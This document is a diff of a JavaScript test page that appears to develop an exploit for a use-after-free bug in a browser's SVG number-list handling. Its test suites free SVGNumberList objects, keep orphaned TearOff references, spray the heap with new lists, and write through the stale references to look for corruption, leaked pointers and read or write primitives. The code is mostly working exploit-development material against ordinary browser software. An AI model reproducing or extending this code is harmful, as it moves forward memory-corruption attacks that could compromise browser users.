-// Alternative angle: read animVal AFTER aggressive GC (hope C++ TearOff slot
-// is reused by something interesting).
+// This is a stress test of the UAF notification chain.
+// If any cumulative state change occurs → important signal.
 // ═══════════════════════════════════════════════════════════════
-suites['ADR78']=function(){
-  L('ADR78: read primitive probe — IsoHeap zero-on-free check + pointer-value scan','info');
+suites['ADR83']=function(){
+  L('ADR83: 20 orphaned TearOffs → same freed list_A → stress UAF notification chain','info');
 
-  // Allocate 500 lists, free 250, allocate 500 more
-  // Check if any of the NEW 500 have non-zero initial values before our init
-  // (Only possible if: IsoHeap reuses freed slot AND doesn't zero it)
-  //
-  // Problem: we can't read a value BEFORE the SVGNumber is initialized by
-  // the 'values' attribute parsing. The attribute sets the value.
-  // We need a path to READ a newly allocated SVGNumber before it's initialized.
-  //
-  // Actually: SVGNumber's default constructor sets m_value = 0.
-  // But what if we can ADD an item to a list without setting a value?
-  //   feColorMatrix.values.baseVal.appendItem(new SVGNumber) ?
-  //   appendItem creates a new SVGNumber with default value 0.
-  // We can't easily read the raw uninitialized bytes.
-  //
-  // Alternative approach: monitor whether the freed slot VALUE changes
-  // to something unexpected via a 3rd-party observer.
+  // Create feColorMatrix with 20 distinct values
+  var initVals83=[];
+  for(var i=0;i<20;i++) initVals83.push((i+1)*100);
+  var o83=makeFe('83',initVals83);
 
-  // Simpler test: create/free/recreate cycle, check values
-  L('ADR78: creating 200 lists with canaries...','info');
-  var batch1=[];
-  for(var i=0;i<200;i++) batch1.push(makeList('b78_'+i,(i+1)*100));
-
-  L('ADR78: freeing first 100 lists...','info');
-  var freed78=batch1.splice(0,100);
-  freed78.forEach(function(s){s.svg.remove();s=null;});
-  freed78=null;
-
-  gcFull();gcFull();
-
-  L('ADR78: allocating 100 new lists after freeing 100...','info');
-  var batch2=[];
-  for(var i=0;i<100;i++) batch2.push(makeList('c78_'+i,(i+201)*100));
-
-  // Check if any new list reads unexpected values (pointer-like)
-  var ptrHits=[];
-  batch2.forEach(function(s,i){
-    var v=s.item.value;
-    var bits=f32bits(v);
-    if(isPointerLike32(bits)){
-      ptrHits.push({i:i,v:v,bits:f32hex(v)});
-    }
-    // Also check for non-initialized: should be (i+201)*100
-    var exp=(i+201)*100;
-    if(Math.abs(v-exp)>0.5){
-      L('★ ADR78 batch2['+i+']: exp='+exp+' got='+v.toFixed(3)+' bits='+f32hex(v),'warn');
-    }
-  });
-
-  if(ptrHits.length>0){
-    L('★★★ ADR78: '+ptrHits.length+' pointer-like values in new SVGNumbers!','hit');
-    ptrHits.forEach(function(x){L('  batch2['+x.i+']: v='+x.v+' bits='+x.bits,'hit');});
-  } else {
-    L('ADR78: 0 pointer-like values — IsoHeap zero-on-free or bump-only (no slot reuse)','info');
-  }
-
-  // All remaining batch1 intact?
-  var bad1=[];
-  batch1.forEach(function(s,i){
-    var exp=(i+101)*100;
-    if(Math.abs(s.item.value-exp)>0.5) bad1.push({i:i,exp:exp,got:s.item.value});
-  });
-  L('ADR78: batch1 intact? '+(bad1.length===0?'YES ('+batch1.length+' remaining)':'NO — '+bad1.length+' corrupted'),'info');
-
-  batch1.forEach(function(s){s.svg.remove();});
-  batch2.forEach(function(s){s.svg.remove();});
-};
-
-// ═══════════════════════════════════════════════════════════════
-// ADR79 — IsoHeap FREE-LIST confirmation
-//
-// The "bump-only" conclusion from v65-69 might be wrong if:
-// - SMIL holds RefPtr to all per-frame SVGNumbers → they're never freed
-// - So the free list was never populated in earlier tests
-// - ADR73 CONFIRMED list_A IS freed after setAttributeNS
-// - So the SVGNumberList IsoHeap bin DOES have freed slots
-//
-// Test: Is IsoHeap for SVGNumberList bump-only or does it reuse freed slots?
-//
-// Method:
-// 1. Alloc 1000 SVGNumberLists (batch A) — all with unique canary at [0]
-// 2. Free ALL 1000 (setAttributeNS + orphan TearOff + GC)
-//    → 1000 freed SVGNumberList slots in IsoHeap
-// 3. Alloc 1000 NEW SVGNumberLists (batch B)
-// 4. Check: do any batch B lists have unexpected initial values?
-//    (would indicate they landed at batch A's freed addresses with old data)
-// 5. Also: do batch A's orphaned TearOffs still read correctly?
-//    (they should still read old values from the still-live SVGNumbers they hold)
-//
-// Actually the real test for free-list:
-// - The per-list SVGNumberList object itself is freed
-// - We want to know if batch B lands at batch A's old addresses
-// - We can't directly observe addresses from JS
-// - BUT: if IsoHeap has free-list, batch B might land at batch A addresses
-//   AND if those slots were NOT zeroed: batch B.getItem(0).value = old batch A value
-//
-// This only works if IsoHeap DOESN'T zero freed slots.
-// ADR52 showed fastMalloc zeros on free.
-// Does IsoHeap ALSO zero? Different codepath.
-//
-// Test design:
-// - Batch A: 100 lists with canary (i+1)*9999 (unique, non-zero)
-// - Free batch A (setAttributeNS on each, release all TearOffs, GC)
-// - Batch B: 100 lists, initialize them all to value=11111
-// - Read batch B's getItem(0).value
-// - If any reads EXACTLY (i+1)*9999 (old canary): slot reused AND not zeroed
-// - If all read 11111: either bump-only or zeroed on free
-//
-// Secondary check: can we distinguish between bump-only vs zeroed free-list?
-// → Alloc batch C with value=0 (instead of 11111)
-// → If any batch C reads (i+1)*9999: not zeroed + free-list → CONFIRMED
-// → If all batch C reads 0: can't distinguish (both zero → same result)
-//
-// For the canary test to work: read getItem(0).value BEFORE the setAttribute
-// That's not possible since setAttribute IS how we set the value...
-//
-// Real approach: use the SVGNumber DIRECT allocation via script
-// We need to catch the SVGNumber BEFORE the value is set by attribute parsing.
-// appendItem() creates a new SVGNumber with value=0 (default constructor).
-// If that 0 was ALREADY at the freed slot: indistinguishable from initialization.
-// We need a path where the freed slot had a NONZERO value AND we read BEFORE init.
-//
-// Actually: SVGNumber's default constructor ALWAYS sets m_value = 0.0f.
-// So EVEN if we reuse a freed slot with a nonzero old value:
-// the constructor overwrites it to 0. So we CANNOT detect unzeroed reuse
-// through SVGNumber initialization.
-//
-// FINAL APPROACH: detect free-list via allocation count change.
-// If IsoHeap has free-list: allocating after freeing uses freed slots → no bump growth
-// If bump-only: allocating after freeing → bump pointer advances → more memory used
-// We can't directly observe memory usage from JS.
-//
-// USE A TIMING APPROACH:
-// Allocating from free-list = faster than bumping (different code path).
-// Time 1000 allocs with no prior frees vs 1000 allocs after 1000 frees.
-// If time_with_frees < time_no_frees: free-list being used (faster).
-// If times equal: bump-only.
-// ═══════════════════════════════════════════════════════════════
-suites['ADR79']=function(){
-  L('ADR79: IsoHeap free-list confirmation — timing + write-on-freed-slot','info');
-
-  // PART A: timing baseline — 500 fresh allocs
-  var t0a=performance.now();
-  var baselineAllocs=[];
-  for(var i=0;i<500;i++) baselineAllocs.push(makeList('ba79_'+i,(i+1)*77));
-  var t1a=performance.now();
-  var timeBaseline=t1a-t0a;
-  L('ADR79-A: 500 fresh allocs time='+timeBaseline.toFixed(1)+'ms','info');
-
-  // Free them all
-  baselineAllocs.forEach(function(s){s.svg.remove();});
-  baselineAllocs=null;
-  gcFull();gcFull();
-
-  // PART B: 500 allocs after freeing 500 → free-list populated (if it exists)
-  var t0b=performance.now();
-  var afterFreeAllocs=[];
-  for(var i=0;i<500;i++) afterFreeAllocs.push(makeList('ab79_'+i,(i+1)*88));
-  var t1b=performance.now();
-  var timeAfterFree=t1b-t0b;
-  L('ADR79-B: 500 allocs after freeing 500: time='+timeAfterFree.toFixed(1)+'ms','info');
-  L('ADR79: timing ratio afterFree/baseline='+((timeAfterFree/timeBaseline)*100).toFixed(1)+'%','info');
-
-  if(timeAfterFree < timeBaseline*0.7){
-    L('★★★ ADR79: afterFree MUCH FASTER → IsoHeap has free-list (slots reused, no bump)','hit');
-  } else if(timeAfterFree < timeBaseline*0.9){
-    L('ADR79: afterFree slightly faster → possible free-list usage','warn');
-  } else {
-    L('ADR79: similar times → bump-only IsoHeap (no free-list, each alloc bumps)','info');
-  }
-
-  // PART C: write-on-freed-slot confirmation
-  // Create list, record canary, trigger free via setAttributeNS,
-  // then create 100 new lists and check their initial values via IIFE trick
-  L('ADR79-C: write-on-freed-slot — checking if new lists inherit old data','info');
-
-  // Create 20 victim lists with very distinctive canaries
-  var victims79=[];
+  // Grab all 20 TearOffs
+  var tearoffs83=[];
+  var bv83=o83.fe.values.baseVal;
   for(var i=0;i<20;i++){
-    victims79.push(makeList('vc79_'+i,(i+1)*99999));
+    tearoffs83.push(bv83.getItem(i));
   }
-  L('ADR79-C: 20 victim lists with canaries 99999..1999980','info');
+  L('ADR83: grabbed 20 TearOffs, values: ['+tearoffs83.slice(0,4).map(function(t){return t.value.toFixed(0);}).join(',')+',...]','info');
 
-  // Free them via setAttributeNS + GC
-  var orphans79=[];
-  victims79.forEach(function(s,i){
-    var T=s.fe.values.baseVal.getItem(0);
-    orphans79.push(T);
-    var nv=[];for(var k=0;k<20;k++)nv.push(k===0?0:0);
-    s.fe.setAttributeNS(null,'values',nv.join(' '));
-    // release list ref
-    s.list=null;
-  });
+  // Record baseline
+  var baseline_attr83=o83.fe.getAttribute('values');
+  var baseline_bv83=[];
+  for(var i=0;i<5;i++) baseline_bv83.push(o83.fe.values.baseVal.getItem(i).value);
 
-  gcFull();gcFull();gcFull();
+  // setAttributeNS → frees list_A, all 20 TearOffs orphaned
+  var newVals83=[];for(var i=0;i<20;i++)newVals83.push(i===0?999:0);
+  o83.fe.setAttributeNS(null,'values',newVals83.join(' '));
+  L('ADR83: setAttributeNS done → list_A freed, all 20 TearOffs orphaned','info');
 
-  // Now alloc 100 new lists → might land at freed victim slots
-  var probes79=[];
-  for(var i=0;i<100;i++){
-    var s=document.createElementNS(SVG_NS,'svg');document.body.appendChild(s);
-    var fe=document.createElementNS(SVG_NS,'feColorMatrix');
-    fe.setAttribute('type','matrix');
-    // DO NOT set values via attribute — use appendItem to get "raw" initial value
-    // (though SVGNumber default constructor sets m_value=0)
-    // Actually we have to set values to make it a valid 20-element list...
-    var vz=[];for(var k=0;k<20;k++)vz.push(0);
-    fe.setAttribute('values',vz.join(' '));
-    s.appendChild(fe);
-    // Read value BEFORE setting canary
-    var rawInit=fe.values.baseVal.getItem(0).value;
-    // Now set canary to mark it
-    fe.values.baseVal.getItem(0).value=((i+1)*1111);
-    probes79.push({svg:s,fe:fe,raw:rawInit,canary:(i+1)*1111});
+  // Write to all 20 orphaned TearOffs
+  var writeErrors83=0;
+  for(var i=0;i<20;i++){
+    try{tearoffs83[i].value=(i+1)*11111;}
+    catch(e){writeErrors83++;L('  tearoff['+i+'] write threw: '+e.message,'miss');}
   }
+  L('ADR83: wrote to 20 orphaned TearOffs (errors='+writeErrors83+')','info');
 
-  // Check raw init values — any match victim canaries?
-  var hits79=probes79.filter(function(p){
-    return victims79.some(function(v){return Math.abs(p.raw-(v.canary))<=0.5;});
-  });
-  var nonZeroRaw=probes79.filter(function(p){return Math.abs(p.raw)>0.1;});
+  // Check DOM state after 20 UAF writes
+  var after_attr83=o83.fe.getAttribute('values');
+  var after_bv83=[];
+  for(var i=0;i<5;i++) after_bv83.push(o83.fe.values.baseVal.getItem(i).value);
+  var after_items83=o83.fe.values.baseVal.numberOfItems;
 
-  L('ADR79-C: probes with non-zero raw init value: '+nonZeroRaw.length+'/100','info');
-  if(nonZeroRaw.length>0){
-    L('★★★ ADR79-C: non-zero raw init → IsoHeap did NOT zero freed slot before reuse!','hit');
-    nonZeroRaw.slice(0,5).forEach(function(p){
-      L('  probe raw='+p.raw.toFixed(3)+' bits='+f32hex(p.raw),'warn');
-    });
+  L('ADR83: getAttribute changed? '+(baseline_attr83!==after_attr83),'info');
+  if(baseline_attr83!==after_attr83){
+    L('★★★ ADR83: getAttribute CHANGED!','hit');
+    L('  before='+baseline_attr83.substring(0,50),'hit');
+    L('  after='+after_attr83.substring(0,50),'hit');
   }
-  if(hits79.length>0){
-    L('★★★ ADR79-C: '+hits79.length+' probes read OLD VICTIM CANARY VALUES → free-list reuse confirmed!','hit');
-  } else {
-    L('ADR79-C: all probes init=0 (IsoHeap zeros freed slots or bump-only)','info');
+  L('ADR83: baseVal items after 20 writes:','info');
+  for(var i=0;i<5;i++){
+    var exp=newVals83[i];// list_B values
+    var got=after_bv83[i];
+    var changed=(Math.abs(got-exp)>0.5);
+    L('  bv['+i+']: expected='+exp+' got='+got+(changed?' ★CORRUPTED★':''),'info');
   }
+  L('ADR83: numberOfItems='+after_items83+' (should be 20)','info');
 
-  // PART D: the ADR68/ADR73 combo test — spray SVGNumberLists to land at freed list_A,
-  // then trigger notification write, check for any probe reading unexpected value
-  // This is the most direct test of "write primitive into controlled SVGNumberList"
-  L('ADR79-D: direct combo — free list_A, spray 200 SVGNumberLists, write to orphaned TearOff','info');
-
-  var combo=makeList('cm79',12345);
-  var T_combo=combo.fe.values.baseVal.getItem(0);
-  // register for GC confirmation
-  var comboListFreed=false;
-  var regD=new FinalizationRegistry(function(t){
-    if(t==='combo_list') comboListFreed=true;
-    L('ADR79-D: FinalizationRegistry fired: '+t,'warn');
-  });
-  if(combo.list) regD.register(combo.list,'combo_list');
-  combo.list=null;
-
-  // setAttributeNS → free list_A
-  var nvcm=[];for(var i=0;i<20;i++)nvcm.push(0);
-  combo.fe.setAttributeNS(null,'values',nvcm.join(' '));
-  L('ADR79-D: setAttributeNS done','info');
-
-  // GC to confirm list freed
-  gcFull();
-
-  setTimeout(function(){
-    L('ADR79-D: combo list freed? '+comboListFreed,'info');
-
-    // Spray 200 new SVGNumberLists immediately
-    var spray_d=[];
-    for(var i=0;i<200;i++) spray_d.push(makeList('spd79_'+i,(i+1)*333));
-    L('ADR79-D: 200 SVGNumberLists sprayed (canaries 333..66600)','info');
-
-    // Write to orphaned TearOff → notification fires → writes to freed list_A / spray target
-    try{T_combo.value=77777;}catch(e){L('write threw: '+e.message,'miss');}
-    L('ADR79-D: wrote T_combo.value=77777','info');
-
-    // Check spray for corruption
-    var badD=[];
-    spray_d.forEach(function(s,i){
-      var exp=(i+1)*333;
-      var got=s.item.value;
-      if(Math.abs(got-exp)>0.5) badD.push({i:i,exp:exp,got:got,bits:f32hex(got)});
-    });
-
-    if(badD.length>0){
-      L('★★★ ADR79-D: '+badD.length+' SPRAY LISTS CORRUPTED!','hit');
-      badD.forEach(function(x){L('  spray['+x.i+']: exp='+x.exp+' got='+x.got.toFixed(3)+' bits='+x.bits,'hit');});
-    } else {
-      L('ADR79-D: 0 corruptions (IsoHeap bump-only — freed slot not reused by spray)','info');
+  // Also check: do orphaned TearOff reads show anything interesting?
+  L('ADR83: reading orphaned TearOffs AFTER all writes:','info');
+  for(var i=0;i<5;i++){
+    var expected_write=(i+1)*11111;
+    var got_read=tearoffs83[i].value;
+    var bits=f32hex(got_read);
+    L('  tearoff['+i+']: wrote='+expected_write+' reads back='+got_read.toFixed(1)+' bits='+bits,'info');
+    // Does bits look like a pointer?
+    if(got_read!==expected_write && Math.abs(got_read-expected_write)>1){
+      L('★ ADR83: tearoff['+i+'] readback DIFFERS from written value! (read from freed SVGNumber)','warn');
     }
+  }
 
-    // Cleanup
-    spray_d.forEach(function(s){s.svg.remove();});
-    combo.svg.remove();
-    afterFreeAllocs.forEach(function(s){s.svg.remove();});
-    probes79.forEach(function(p){p.svg.remove();});
-    victims79.forEach(function(v){v.svg.remove();});
-  },300);
+  o83.svg.remove();
+};
+
+// ═══════════════════════════════════════════════════════════════
+// ADR84 — SVGNumber m_owner STALE BACKPTR: complete lifecycle mapping
+//
+// ADR73 confirmed:
+// - After setAttributeNS: list_A freed, list_B created
+// - T_old (orphaned) still holds RefPtr to SVGNumber_old (from list_A)
+// - SVGNumber_old.m_owner = raw ptr to freed list_A (STALE)
+//
+// What if INSTEAD we change ownership: set list_A on a DIFFERENT element?
+// Test: can we attach the same list to two elements simultaneously?
+// Probably not (SVGNumberList is owned by one element at a time).
+//
+// NEW TEST: What happens to m_owner when SMIL creates a NEW animated value?
+//
+// When SMIL animates feColorMatrix, it creates an SVGNumber for animVal.
+// That animated SVGNumber might have m_owner = SVGNumberList_animVal (a
+// DIFFERENT list than baseVal). If we can grab an orphaned TearOff from
+// animVal (but animVal is read-only...).
+//
+// DIFFERENT ANGLE: after setAttributeNS creates list_B, list_B's
+// SVGNumbers have m_owner = list_B. The ORIGINAL list_A's SVGNumbers
+// (referenced by orphaned TearOffs) have m_owner = freed list_A.
+//
+// What if we then setAttributeNS AGAIN? Creates list_C, frees list_B.
+// The orphaned TearOffs still point to list_A's SVGNumbers.
+// Multiple consecutive setAttributeNS = chain of freed lists.
+//
+// Test: N consecutive setAttributeNS calls while holding one orphaned TearOff.
+// Does the TearOff's value read change across these frees?
+// Does writing to the TearOff cause different behavior for each generation?
+//
+// Also: does the feColorMatrix element accumulate any corruption state
+// when its baseVal list is freed/re-created repeatedly?
+// ═══════════════════════════════════════════════════════════════
+suites['ADR84']=function(){
+  L('ADR84: multi-generation setAttributeNS lifecycle — stale m_owner chain','info');
+
+  var baseVals84=[];for(var i=0;i<20;i++)baseVals84.push(i===0?1:0);
+  var o84=makeFe('84',baseVals84);
+
+  // Grab TearOff from generation 0 (list_A)
+  var T_gen0=o84.fe.values.baseVal.getItem(0);
+  L('ADR84: T_gen0.value='+T_gen0.value+' (gen0, list_A)','info');
+
+  // Generation 1: setAttributeNS → frees list_A, creates list_B
+  var v1=[];for(var i=0;i<20;i++)v1.push(i===0?111:0);
+  o84.fe.setAttributeNS(null,'values',v1.join(' '));
+  var T_gen1=o84.fe.values.baseVal.getItem(0);
+  L('ADR84: after gen1 setAttr: T_gen0.value='+T_gen0.value+' T_gen1.value='+T_gen1.value,'info');
+
+  // Generation 2: setAttributeNS → frees list_B, creates list_C
+  var v2=[];for(var i=0;i<20;i++)v2.push(i===0?222:0);
+  o84.fe.setAttributeNS(null,'values',v2.join(' '));
+  var T_gen2=o84.fe.values.baseVal.getItem(0);
+  L('ADR84: after gen2 setAttr: T_gen0.value='+T_gen0.value+' T_gen1.value='+T_gen1.value+' T_gen2.value='+T_gen2.value,'info');
+
+  // Generation 3
+  var v3=[];for(var i=0;i<20;i++)v3.push(i===0?333:0);
+  o84.fe.setAttributeNS(null,'values',v3.join(' '));
+  var T_gen3=o84.fe.values.baseVal.getItem(0);
+  L('ADR84: after gen3 setAttr: T_gen0='+T_gen0.value+' T_gen1='+T_gen1.value+' T_gen2='+T_gen2.value+' T_gen3='+T_gen3.value,'info');
+
+  // Write to all generations — which ones fire notifications and where?
+  L('ADR84: writing to all orphaned generations...','info');
+  var writes=[
+    {t:T_gen0,v:10000,gen:'gen0'},
+    {t:T_gen1,v:20000,gen:'gen1'},
+    {t:T_gen2,v:30000,gen:'gen2'},
+    {t:T_gen3,v:40000,gen:'current gen3'},
+  ];
+
+  writes.forEach(function(w){
+    var before_attr=o84.fe.getAttribute('values');
+    var before_bv=o84.fe.values.baseVal.getItem(0).value;
+    try{
+      w.t.value=w.v;
+      var after_attr=o84.fe.getAttribute('values');
+      var after_bv=o84.fe.values.baseVal.getItem(0).value;
+      var attr_changed=(before_attr!==after_attr);
+      var bv_changed=(Math.abs(after_bv-before_bv)>0.1);
+      L('ADR84: wrote '+w.v+' to '+w.gen+': attr_changed='+attr_changed+' bv_changed='+bv_changed+' (bv='+after_bv.toFixed(1)+')','info');
+      if(attr_changed) L('★★★ ADR84: '+w.gen+' write changed getAttribute!','hit');
+      if(bv_changed) L('★★★ ADR84: '+w.gen+' write changed baseVal!','hit');
+    }catch(e){
+      L('ADR84: '+w.gen+' write threw: '+e.message,'miss');
+    }
+  });
+
+  // Check: do orphaned TearOff readbacks reveal anything about freed memory?
+  L('ADR84: readback check on all generations:','info');
+  writes.forEach(function(w){
+    var readback=w.t.value;
+    var match=(Math.abs(readback-w.v)<0.5);
+    L('  '+w.gen+': wrote='+w.v+' reads='+readback.toFixed(1)+' (match='+match+') bits='+f32hex(readback),'info');
+  });
+
+  // Final: after all this chaos, is element still functional?
+  var final_attr=o84.fe.getAttribute('values');
+  var final_bv=o84.fe.values.baseVal.getItem(0).value;
+  L('ADR84: final element state: getAttribute[0]='+parseFloat(final_attr).toFixed(1)+' baseVal[0]='+final_bv.toFixed(1),'info');
+
+  o84.svg.remove();
 };
 </script>
 </body>
